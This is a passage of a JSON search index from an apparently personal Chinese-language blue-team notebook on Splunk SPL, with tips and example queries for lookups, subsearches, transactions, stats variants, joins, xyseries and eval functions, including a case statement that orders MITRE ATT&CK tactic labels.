\u5176\u5b9e\u6709cidrmatch</p> <pre><code>index=dns\n| rex field=src \"(?&lt;IP_OCTET123&gt;^\\d+\\.\\d+\\.\\d+)\\.(?&lt;IP_OCTET4&gt;\\d+$)\"\n| eval CIDR=if(IP_OCTET4&lt;128, IP_OCTET123.\".0\", IP_OCTET123.\".128\")\n| lookup infrasec_ip_lookup CIDR OUTPUT Company as src_Company\n\n| stats count by src, src_Company\n</code></pre> <pre><code>| makeresults \n| eval ip=\"10.2.4.2,10.2.4.3\" \n| makemv delim=\",\" ip \n| mvexpand ip\n| rex field=ip \"(?&lt;IP_OCTET123&gt;^\\d+\\.\\d+\\.\\d+)\\.(?&lt;IP_OCTET4&gt;\\d+$)\" \n| eval CIDR=if(IP_OCTET4&lt;128, IP_OCTET123.\".0\", IP_OCTET123.\".128\") \n| lookup infrasec_ip_lookup CIDR\n| fields - *_*\n| table ip, Company, Manager, \"Management Area\", \"Management Section\"\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#inputlookup","title":"inputlookup","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#lookup-table","title":"\u663e\u793a\u4fdd\u5b58\u7684lookup table","text":"<p><code>| inputlookup\u00a0 infrasec_ipaddress_lookup.csv</code></p> <ul> <li>\u7406\u89e3\uff1a\u5c06lookup\u7684\u6570\u636e input/\u5bfc\u5165 \u5230splunk\u3002</li> </ul> <p>[!NOTE] \u6ce8\u610f\uff1a\u522b\u7528<code>outputlookup</code>\uff0c\u90a3\u662f\u4fdd\u5b58\uff01\uff01</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#subsearch","title":"subsearch","text":"<p>\u5b50\u641c\u7d22\u7528\u65b9\u62ec\u53f7\uff0c\u4f1a\u9996\u5148\u5904\u7406\u2014\u2014\u53ef\u7406\u89e3\u4e3a\u5b50\u8fdb\u7a0b</p> <ul> <li>\u9ed8\u8ba41W\u884c\u7684\u7ed3\u679c\u4e0a\u9650\uff08\u516c\u53f8\u6539\u52305w\uff09 \u2014\u2014&gt; \u5404\u79cd\u9650\u5236\uff08limits.conf\uff09</li> <li>\u9ed8\u8ba41min\u7684\u6267\u884c\u65f6\u95f4</li> <li>\u6ce8\u610f\uff1a\u5982\u679c\u5916\u90e8\u641c\u7d22\u5728real-time\u6267\u884c\uff0c\u90a3\u4e48\u5b50\u641c\u7d22\u9ed8\u8ba4\u5168\u65f6\u95f4\u641c\u7d22\u2014\u2014\u6240\u4ee5\u53ef\u4ee5\u9650\u5b9a\u65f6\u95f4\u6765\u89c4\u907f\u3002\u53e6\u5916\uff0c\u5b50\u641c\u7d22\u6c38\u8fdc\u4e0d\u4f1a\u4ee5real-time\u6267\u884c\u3002</li> </ul> <p>\u751a\u81f3\u53ef\u4ee5\u7528 <code>NOT [subsearch]</code> \u7684\u5f62\u5f0f\u3002\u5b50\u641c\u7d22\u7684\u7ed3\u679c\u5c55\u5f00\u7684\u8bdd\uff0c\u5176\u5b9e\u5c31\u662f\u7528OR\u8fde\u63a5\u7684\u5404\u4e2a\u952e\u503c\u5bf9\uff0c\u7136\u540e\u7528AND\u8fde\u63a5\u5b50\u641c\u7d22\u7ed3\u679c\u4e0e\u5916\u90e8\u641c\u7d22\u3002</p> <ul> <li>\u7406\u89e3\uff1a\u53ef\u5355\u62ce\u51fa\u5b50\u641c\u7d22\u7136\u540e\u7ed3\u5c3e\u52a0\u4e0a <code>| format</code> \u770b\u770b\u533a\u522b\u2014\u2014\u5c06\u5b50\u641c\u7d22\u7684\u7ed3\u679c\u7528\u5927\u91cf\u62ec\u53f7/OR/AND\u8fde\u63a5\u7136\u540e\u8d4b\u503c\u7ed9search\u5b57\u6bb5\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_4","title":"\u4f18\u5316","text":"<p>\u5982\u679c\u5b50\u641c\u7d22\u7684\u7ed3\u679c\u975e\u5e38\u5927\uff0c\u7528eval&amp;stat\u7ec4\u5408\u66f4\u4e3a\u6548\u7387\uff08\u5982\u4e0b\u5bf9\u6bd4\uff09</p> <ul> <li><code>[search index=x sourcetype=xxx flag=1 | dedup user | fields user]</code></li> <li><code>| eval flag=if(sourcetype=xxx,1,0) | stats max(flag) as flag_1 by user | where flag_1=1 | sort user</code></li> </ul> <p>\u7ecf\u5e38\u8fd0\u884c\u7684\u641c\u7d22/\u5730\u65b9\uff08schedule\u3001dashboard\uff09\u4e0d\u5efa\u8bae\u4f7f\u7528\u5b50\u641c\u7d22\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_5","title":"\u201c\u7a81\u7834\u4e0a\u9650\u201d","text":"<p>\u5173\u952e\u662f\u591a\u5d4c\u5957\u4e00\u4e2a\u5b50\u641c\u7d22\u4ee5\u83b7\u53d6\u6307\u5b9a\u76ee\u6807\u3002</p> <pre><code>index=ad_ja 10.1.4.* sourcetype=AD \n| eval USR_ID=global_id \n| stats count by AD_USERID USR_ID action \n| join type=outer USR_ID \n    [ search index=ids earliest=-1d \n        [ search index=ad_ja 10.1.4.* sourcetype=AD earliest=-1mon@mon latest=@mon \n        | dedup global_id \n        | fields global_id \n        | rename global_id AS USR_ID]\n    ]\n</code></pre>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#union","title":"<code>| union</code>","text":"<ul> <li>union \u547d\u4ee4\u53ef\u4ee5\u7ec4\u5408\u4e24\u4e2a\u6216\u591a\u4e2a\u4e0d\u540c\u6570\u636e\u96c6\u7684\u7ed3\u679c\uff08\u6570\u636e\u6a21\u578b\u3001\u5b50\u641c\u7d22\u3001\u67e5\u627e\u548c\u4fdd\u5b58\u7684\u641c\u7d22\uff09\u3002</li> <li>join \u547d\u4ee4\u53ea\u80fd\u7ec4\u5408\u4e24\u4e2a\u6570\u636e\u96c6\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#return","title":"return","text":"<p>\u76f8\u5f53\u4e8e\u5b50\u641c\u7d22\u4e2dfields\u547d\u4ee4\u7684\u7cbe\u7ec6\u63a7\u5236\u7248\u672c\u3002</p> <ul> <li>\u9ed8\u8ba4\u8fd4\u56de1\u6761\u7ed3\u679c</li> <li>\u53ef\u4ee5\u7528 <code>$&lt;field&gt;</code> \u4ec5\u8fd4\u56devalue</li> <li>\u53ef\u4ee5\u7528 <code>&lt;alias&gt;=&lt;field&gt;</code> \u6539\u53d8\u5b57\u6bb5\u540d</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#transactions","title":"Transactions","text":"<p><code>| transaction (&lt;field&gt;|&lt;field-list&gt;) [options]</code></p> <p>\u5c06\u4e0d\u540c\u6e90\u7684\u6570\u636e\u805a\u96c6\u5230\u4e00\u8d77\u5e76\u6309\u7167\u7ed9\u5b9a\u6761\u4ef6\u5206\u7ec4\u2014\u2014\u5c06\u7ed9\u5b9a\u5b57\u6bb5\u4e00\u6837\u7684\u503c\u8fdb\u884c\u5206\u7ec4\uff0c\u5982sessionID\u3002\u5176\u4ed6\u5b57\u6bb5\u53d8\u6210\u591a\u503c\uff08\u7c7b\u4f3c<code>stats values()</code>\uff09\u3002</p> <p>transaction\u547d\u4ee4\u4f1a\u6dfb\u52a02\u4e2a\u5b57\u6bb5\u5230raw events\uff1a</p> <ul> <li>duration\uff1atransaction\u4e2d\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2aevent\u7684\u79d2\u6570\u3002</li> <li>eventcount\uff1atransaction\u4e2d\u7684event\u6570\u3002\uff08\u641c\u7d22\u7ed3\u679c\u4e0d\u5c55\u5f00\u7684\u8bdd\u9ed8\u8ba4\u663e\u793a5\u6761\uff09</li> </ul> <p>[!NOTE] transaction\u9ed8\u8ba4\u662f\u6839\u636e\u65f6\u95f4\u5012\u5e8f\u6765\u8ba1\u7b97\u7684 \u6240\u4ee5pipe\u5230transaction\u4e4b\u524d\uff0c\u6ce8\u610f\u4f7f\u7528 <code>| sort -_time</code>\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#keepevicted","title":"keepevicted\u9009\u9879","text":"<ul> <li><code>keepevicted=0</code>\uff1a\u9ed8\u8ba4\uff0c\u4ec5\u663e\u793a\u5b8c\u6210\u4e86\u7684transaction\u3002</li> <li><code>keepevicted=1</code>\uff1a\u663e\u793a\u6240\u6709transaction</li> </ul> <p>[!NOTE] evicted: \u88ab\u9a71\u9010\u7684</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#transactions_1","title":"\u5224\u65adTransactions\u662f\u5426\u5b8c\u6210","text":"<p>\u5f53\u8bbe\u7f6e<code>keepevicted=1</code>\u65f6\uff0c\u5bf9\u4e8e\u6240\u6709\u7ed3\u679c\u4e2d\u201c\u88ab\u9a71\u9010\u7684\u201dtransaction\uff0c\u5176<code>closed_txn</code>\u5b57\u6bb5\uff1a</p> <ul> <li>0\uff1a\u672a\u5b8c\u6210\u2014\u2014\u5373\u201c\u88ab\u9a71\u9010\u201d\u7684\u3002</li> <li>1\uff1a\u5b8c\u6210\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_6","title":"\u5173\u4e8e\u9009\u9879\u9ed8\u8ba4\u503c","text":"<ul> <li>maxspan\uff1a-1\uff08\u65e0\u9650\u5236\uff09</li> <li>maxpause\uff1a-1\uff08\u65e0\u9650\u5236\uff09</li> <li>maxevents\uff1a1000</li> </ul> <p>[!NOTE] \u6ce8\u610f\uff08\u5bf9\u6bd4<code>stats</code>\uff09 <code>transaction</code>\u9ed8\u8ba4\u5177\u67091000\u7684\u4e0a\u9650\u2014\u2014\u5373\u5230\u8fbe1000\u5c31\u4f1a\u65b0\u5f00\u4e00\u4e2atransaction\u3002\u800c<code>stats</code>\u65e0\u4e0a\u9650\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_7","title":"\u4f18\u5316","text":"<p><code>transaction</code>\u662fresource intensive\u578b\u547d\u4ee4\u3002\u6240\u4ee5\u9664\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff0c\u5c3d\u91cf\u7528\u66f4\u9ad8\u6548\u7684<code>stats</code> \u547d\u4ee4\u3002</p> <ul> <li>\u9700\u8981\u6839\u636e\u591a\u4e2a\u5b57\u6bb5\u8fdb\u884c\u5206\u7ec4\u3002</li> <li>\u9700\u8981\u5b9a\u4e49\u5f00\u59cb/\u7ed3\u675f\u6216\u5206\u6bb5\u65f6\u95f4\u3002</li> <li>\u5e0c\u671b\u4fdd\u7559\u6bcf\u6761event\u4e0eraw data\u7684\u5173\u8054\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#stats","title":"stats","text":"<p>[!NOTE] \u8e29\u5751\uff1a\u7edf\u8ba1\u65f6\u6ce8\u610fevent\u662f\u5426\u6709\u76ee\u6807\u5b57\u6bb5 stats\u53ea\u4f1a\u7edf\u8ba1\u6709\u76ee\u6807\u5b57\u6bb5\u7684event\u3002\u6240\u4ee5\u5982\u679c\u539fevent\u4e2d\u67d0\u4e9bevent\u6ca1\u6709A\u5b57\u6bb5\uff0c\u800cBY\u5b50\u53e5\u53c8\u5199\u4e86A\u5b57\u6bb5\uff0c\u90a3\u4e48\u5c06\u53ea\u4f1a\u7edf\u8ba1\u6709A\u5b57\u6bb5\u7684\u90a3\u90e8\u5206event\u3002\u5373\u53ef\u80fd\u4e22\u5931\u4e00\u90e8\u5206\u81ea\u5df1\u4ece\u641c\u7d22\u7ed3\u679c\u770b\u5230\u7684\u5185\u5bb9\u3002</p> <p>^fc8c23</p> <p>over\u7406\u89e3\u4e3a\uff1a\u201c\u9488\u5bf9\u201d\u3001\u201c\u5bf9\u4e8exxx\u5b57\u6bb5\u7684\u6bcf\u4e2a\u503c\u201d\u3002</p> <p>over\u7684\u503c\u4f1a\u663e\u793a\u5728\u884c\uff0c\u800cby\u7684\u503c\u663e\u793a\u4e3a\u5217\u3002\u90a3\u4e48\u5176\u5b9eover\u548cby\u6ca1\u6709\u592a\u5927\u5dee\u522b\uff0c\u4ec5\u4ec5\u662f\u5c55\u793a\u7684\u6548\u679c\u2014\u2014\u5373over\u662fx\u8f74\uff0c\u800cby\u8868\u793a\u5bf9\u7edf\u8ba1\u8fdb\u884c\u5206\u7ec4</p> <p>\u4f7f\u7528over\u65f6\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2aby\u5b57\u6bb5\u3002 \u5f53\u4e0d\u4f7f\u7528over\u76f4\u63a5by\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5219\u7b2c\u4e00\u4e2a\u5b57\u6bb5\u88ab\u89c6\u4e3aover\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#eventstats","title":"eventstats\uff08\u8ffd\u52a0\u5217\u2014\u2014\u53cc\u91cd\u7edf\u8ba1\uff09","text":"<ul> <li>SPL memo#stats\u53d8\u4f53</li> </ul> <p>\u5f53\u6211\u7528\u8fc7\u4e00\u6b21stats\u540e\uff0c\u8fd8\u60f3\u66f4\u8fdb\u4e00\u6b65\u7edf\u8ba1\u65f6\uff0c\u518d\u52a0\u4e00\u4e2astats\u7684\u8bdd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0table\u8986\u76d6\u524d\u9762\u7684\u7edf\u8ba1\u2014\u2014\u6240\u4ee5\uff0c\u7528eventstats\u7684\u8bdd\u80fd\u8ffd\u52a0\u4e00\u5217\u8ba1\u7b97\u524d\u9762\u7edf\u8ba1\u7ed3\u679c\u7684\u7edf\u8ba1\uff08\u5373\u4fdd\u7559\u539f\u7edf\u8ba1\uff09\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#streamstats","title":"streamstats\uff08\u52a8\u6001\u7edf\u8ba1\uff09","text":"<ul> <li>SPL memo#stats\u53d8\u4f53</li> </ul> <p>\u6bd4eventstats\u63a7\u5236\u5f97\u66f4\u7cbe\u7ec6\u2014\u2014\u80fd\u7edf\u8ba1\u6307\u5b9a\u6761\u6570\u7684event\uff0c\u5982\u79fb\u52a8\u5e73\u5747\u3002\u80fd\u7edf\u8ba1\u6bcf\u4e2aevent\uff0c\u5982stats\u7684count\u662f\u6bcf\u884c\u7684\u603b\u6570\uff0c\u800csteamstats\u5219\u53ef\u4ee5\u8ba1\u7b97multi\u6570\u636e\u3002 \u4e14\u4fdd\u7559\u65f6\u95f4\u7684\u65f6\u95f4\u987a\u5e8f\u3002</p> <p>[!NOTE] \u5173\u952e \u52a8\u6001\u8ba1\u7b97\u6bcf\u6761event\u3002\u5982count\u65f6\uff0c\u6bcf\u6709\u4e00\u6761event\u88ab\u4f7f\u7528\uff0c\u5c31count\u52a0\u4e00\u3002\u5373\u7d2f\u79ef\u8ba1\u7b97\u3002 </p> <p>[!NOTE] \u6ce8\u610f \u4ec5\u8fd0\u884c\u8fd9\u4e2a\u547d\u4ee4\u662f\u521b\u5efa\u4e00\u4e2a\u5b57\u6bb5\uff0c\u4e0d\u4f1a\u8f6c\u6362\u4e3a\u56fe\u8868\u5f62\u5f0f\u3002</p> <p>\u7279\u6b8a\u9009\u9879\uff1a</p> <ul> <li>window\uff1a\u6307\u5b9a\u4f7f\u7528\u591a\u5c11\u6761event\uff08\u5305\u62ec\u5f53\u524d+\u4e4b\u524d\uff09\u3002\u9ed8\u8ba4\u4e3a0\uff0c\u5373\u6240\u6709\u3002</li> <li>current\uff1a\u9ed8\u8ba4\u4e3ature\u3002\u5373\u5305\u542b\u5f53\u524d\u4e8b\u4ef6\u3002</li> <li>global\uff1atrue\u4e3a\u8de8\u8d8a\u5206\u7ec4\u7edf\u8ba1\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#_8","title":"\u5173\u4e8e\u8868\u7ed3\u5408","text":"<p>\u5404\u79cd\u8868\u7ed3\u5408 \u5173\u4e8e\u51e0\u4e2aappend</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#append","title":"append\uff08\u8ffd\u52a0\u884c\uff09","text":"<p>\u6839\u636e\u5b57\u6bb5\u540d\u662f\u5426\u4e00\u81f4\uff0c\u5448\u73b0\u7684\u7ed3\u679c\u4f1a\u4e0d\u540c\u2014\u2014\u5373\u7eb5\u5411or\u659c\u5411\u7ed3\u5408</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#appendcols","title":"appendcols\uff08\u8ffd\u52a0\u5217\uff09","text":"<p>[!NOTE] \u9677\u9631 \u5982\u679c\u641c\u7d22\u548c\u5b50\u641c\u7d22\u4ee5\u76f8\u540c\u7684\u987a\u5e8f\u4ea7\u751f\u76f8\u540c\u6570\u91cf\u7684\u7ed3\u679c\uff0c\u5219\u53ef\u4ee5\u5b89\u5168\u5730\u4f7f\u7528\u6b64\u547d\u4ee4\u3002\u5426\u5219\uff0c\u60a8\u5c06\u5f97\u5230\u8bef\u5bfc\u6027\u7684\u7ed3\u679c\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#appendpipe","title":"appendpipe\uff08\u8ffd\u52a0\u884c\u2014\u2014\u53cc\u91cd\u7edf\u8ba1\uff09","text":"<p>\u76f8\u5f53\u4e8e\u6dfb\u52a0\u4e00\u4e2a\u7edf\u8ba1\u7684\u5b50\u641c\u7d22\u5230\u884c\u5c3e\u2014\u2014\u5982\u679csort\u4e86\u53c8\u53ef\u4ee5\u5c55\u73b0\u5c0f\u8ba1\u7684\u6548\u679c\u3002 \uff08\u4f3c\u4e4esplunk\u5c06\u884c\u7684\u503c\u53eb\u505alabel\uff09</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#join","title":"join","text":"<ul> <li><code>join [field] [type=] [search]</code>\uff1a<ul> <li>\u6307\u5b9a\u5b57\u6bb5\u7684\u8bdd\uff0c\u9ed8\u8ba4\u662f\u6c42\u96c6\u5408\uff08inner\u7ed3\u5408\uff09</li> <li>\u53ef\u4ee5\u6307\u5b9a <code>type=outer</code>\uff08\u5916\u90e8\u7ed3\u5408\uff09\u2014\u2014\u5bf9\u4e8e\u6ca1\u6709\u5339\u914d\u5230\u7684\uff0c\u4f1a\u6dfb\u52a0null\u503c\u7684\u5b57\u6bb5</li> <li><code>[field]</code>\u4e0d\u5b58\u5728\u7684event\u5c06\u88ab\u5ffd\u7565</li> </ul> </li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#tabular-output-vs-stats-like-output","title":"Tabular output vs. Stats-like output","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#xyseries","title":"xyseries","text":"<p><code>| xyseries &lt;x-field&gt; &lt;y-name-field&gt; &lt;y-data-field&gt;</code></p> <p>\u4e3b\u8981\u5e94\u7528\u4e3a\u7a81\u7834timechart\u53ea\u80fd\u6709\u4e24\u5217\u7684\u9650\u5236\uff1f\u2014\u2014\u5728stats+eval\u7684\u7edf\u8ba1\u540e\uff0c\u52a0\u4e0a\u65f6\u95f4\u4f1a\u67093\u5217\u3002\u4e8e\u662f\u6307\u5b9a\u65f6\u95f4\u4e3ax\u8f74\uff0c\u53e6\u5916\u4e24\u5217\u5206\u522b\u4e3ay\u8f74\u540d\u53ca\u5176\u503c\u3002\u4f46\u662f\u4f3c\u4e4e\u53ef\u4ee5\u5c06eval\u63d0\u5230 timechart/stats \u524d\u5c31\u53ef\u907f\u514d3\u5217\u7684\u60c5\u51b5\u2026\u2026\u4f46\u662f\uff01\u5173\u4e8e\u4e3a\u4ec0\u4e48\u8981\u5728 stats\u7b49\u547d\u4ee4\u540e\u4f7f\u7528eval\u2014\u2014\u56e0\u4e3a\u8fd9\u6837\u7684SPL\u66f4\u7b80\u5355\u2014\u2014\u4e14\u66f4\u5173\u952e\u7684\u662f\uff1a\u80fd\u66f4\u81ea\u7531\u5730\u4ea4\u6362 x/y \u8f74\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#untalbexyseries","title":"untalbe\u2014\u2014xyseries\u7684\u9006\u8fd0\u7b97","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#xyseries-vs-chart","title":"xyseries vs. chart","text":"<p><code>\u2026| chart A over B by C</code> = <code>\u2026| stats A by B,C | \u2026| xyseries B C A</code></p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#foreach","title":"foreach","text":"<p>foreach\u540e\u6307\u5b9a\u8981\u5faa\u73af\u7684\u5b57\u6bb5\uff08\u53ef\u7528\u901a\u914d\u7b26\uff09 \u5f00\u4e00\u4e2a\u5b50\u641c\u7d22\uff0c\u91cc\u9762\u7528<code>&lt;&lt;FIELD&gt;&gt;</code> \u8c03\u7528\u88ab\u5faa\u73af\u5b57\u6bb5\u7684\u503c\u3002</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#fillnull","title":"fillnull","text":"<p><code>...| fillnul [value=&lt;string&gt;] [&lt;field-list&gt;]</code></p> <ul> <li>\u9ed8\u8ba4\u586b\u5145\u201c0\u201d</li> <li>\u4e0d\u9650\u5b9a\u5b57\u6bb5\u7684\u8bdd\u586b\u5145\u6240\u6709null\u5b57\u6bb5\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#eval-functions","title":"eval-functions\u8be6\u89e3","text":"<p>[!NOTE] \u5c06\u65e0\u5f15\u53f7\u3001\u5355\u5f15\u53f7\u89e3\u91ca\u4e3a\u5b57\u6bb5\uff0c\u5c06\u53cc\u5f15\u53f7\u89e3\u91ca\u4e3a\u503c\u3002\u6ce8\u610f\uff1a\u503c\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\uff01</p>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#eval-function","title":"\u8c03\u7528<code>eval-function</code>\u7684\u51e0\u79cd\u65b9\u5f0f","text":"<p>You can use evaluation functions with the <code>eval</code>, <code>fieldformat</code>, and <code>where</code> commands, and as part of eval expressions with other commands.</p> <ul> <li><code>...| eval &lt;field&gt;=function(..)</code></li> <li><code>...| where function(..)</code></li> <li><code>...| fieldformat &lt;field&gt;=function(..)</code></li> <li><code>...| stats stats-func(eval(function(..)))</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#fieldformat","title":"fieldformat","text":"<ul> <li>\u4f7f\u7528\u548ceval\u4e00\u6837\u7684\u51fd\u6570</li> <li>\u4ec5\u66f4\u6539\u503c\u7684\u663e\u793a\uff0c\u800c\u4e0d\u66f4\u6539\u5e95\u5c42\u7684\u503c\u3002</li> <li>\u6ce8\u610f\uff1a\u683c\u5f0f\u5316\u7684\u503c\u65e0\u6cd5\u88ab\u7528\u4e8e\u5176\u4ed6\u547d\u4ee4\uff0c\u6240\u4ee5\u8981\u665a\u4e8epipeline\u4f7f\u7528\u3002</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#where","title":"where","text":"<p>[!NOTE] \u5c06\u65e0\u5f15\u53f7\u3001\u5355\u5f15\u53f7\u89e3\u91ca\u4e3a\u5b57\u6bb5\uff0c\u5c06\u53cc\u5f15\u53f7\u89e3\u91ca\u4e3a\u503c\u3002\u6ce8\u610f\uff1a\u503c\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\uff01</p> <p>[!NOTE] \u4e3a\u4ec0\u4e48\u6709where\u547d\u4ee4 \u6bd4\u5982search\u4e0d\u652f\u6301\u4e24\u4e2a\u5b57\u6bb5\u95f4\u7684\u6bd4\u8f83\uff0c\u800cwhere\u53ef\u4ee5\u3002</p> <p>[!NOTE] \u5173\u4e8e\u901a\u914d\u7b26</p> <ul> <li>\u4e0d\u8981\u4f7f\u7528<code>*</code>\uff0c\u56e0\u4e3a\u4f1a\u88ab\u89e3\u91ca\u4e3a\u6587\u5b57\u5b57\u7b26\uff08literal character\uff09\u6216\u6570\u5b66\u7b26\u53f7</li> <li>\u4f7f\u7528<code>LIKE</code>\u64cd\u4f5c\u7b26\uff0c\u6216\u8005<code>like(&lt;string&gt;, &lt;pattern&gt;)</code>\u51fd\u6570</li> <li>\u4f7f\u7528<code>%</code>\uff08\u8868\u793a\u591a\u4e2a\u5b57\u7b26\uff09\u6216<code>_</code>\uff08\u8868\u793a\u5355\u4e2a\u5b57\u7b26\uff09</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#functions","title":"\u5e38\u89c1functions","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#conversion","title":"Conversion\u7c7b\u2014\u2014\u5b57\u7b26\u4e32\u683c\u5f0f\u5316","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#text","title":"Text\u7c7b\u2014\u2014\u5b57\u7b26\u4e32\u5904\u7406","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#spath","title":"spath","text":"<ul> <li>\u6700\u597d\u90fd\u6307\u5b9a\uff1ainput/output\u662f\u6307\u5b9a\u5b57\u6bb5\uff0c\u800cpath\u662f\u6307\u5b9a\u8def\u5f84</li> <li>\u6307\u5b9a\u5b50\u8def\u5f84/key\u7528\u70b9\u6216\u65b9\u62ec\u53f7\uff08\u5373\u5b57\u5178/json\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u70b9\u5206\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7528list['key']\u5f62\u5f0f\uff09</li> <li>\u7528\u5927\u62ec\u53f7\u8868\u793a\u672c\u6765\u7684\u5217\u8868\u3002\u5176\u7ed3\u679c\u63d0\u53d6\u4e3a\u591a\u503c\u7684\u5b57\u6bb5\u2014\u2014\u5982\u679c\u8981\u5206\u5c55\u5f00\u6765\u5c31\u7528mvexpand</li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#eval","title":"eval\u51fd\u6570\u5f62\u5f0f\u66f4\u7b80\u5355","text":"<ul> <li><code>... | eval locDesc=spath(_raw, \"vendorProductSet.product.desc.locDesc\")</code></li> </ul>","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#substr","title":"substr","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#comparison-and-conditional-functions","title":"Comparison and Conditional functions","text":"","tags":["IT/Splunk","IT/\u84dd\u961f"]},{"location":"BlueTeam/Splunk/SPL%20memo/#case","title":"case","text":"<p>\u6ce8\u610f\u6700\u540e\u53ef\u80fd\u9700\u8981\u4e00\u4e2a<code>ture()</code>\u6765\u4fdd\u8bc1\u6709\u503c\uff0c\u5426\u5219\u9ed8\u8ba4<code>NULL</code>\u3002</p> <pre><code>| spath input=Mitre path=\"{}.Code\" output=MITRE_Code \n| spath input=Mitre path=\"{}.Label\" output=MITRE_Label \n| eval MITRE=mvzip(MITRE_Code,MITRE_Label, \": \") \n| eval MITRE=if(isnull(MITRE),\"NULL\",MITRE) \n| eval MITRE_Label=if(isnull(MITRE_Label),\"NULL\",MITRE_Label)\n| mvexpand MITRE_Label\n\n| eval MITRE_Label_order = case(\n    like(MITRE_Label, \"%Reconnaissance%\"), 1,\n    like(MITRE_Label, \"%Resource Development%\"), 2,\n    like(MITRE_Label, \"%Initial Access%\"), 3,\n    like(MITRE_Label, \"%Execution%\"), 4,\n    like(MITRE_Label, \"%Persistence%\"), 5,\n    like(MITRE_Label, \"%Privilege Escalation%\"), 6,\n    like(MITRE_Label, \"%Defense Evasion%\"), 7,\n    like(MITRE_Label, \"%Credential Access%\"), 8,\n    like(MITRE_Label, \"%Discovery%\"), 9,\n    like(MITRE_Label, \"%Lateral Movement%\"), 10,\n    like(MITRE_Label, \"%Collection%\"), 11,\n    like(MITRE_Label, \"%Command and Control%\"), 12,\n    like(MITRE_Label, \"%Exfiltration%\"), 13,\n    like(MITRE_Label, \"%Impact%\"), 14,\n    true(), 15\n)\n| sort 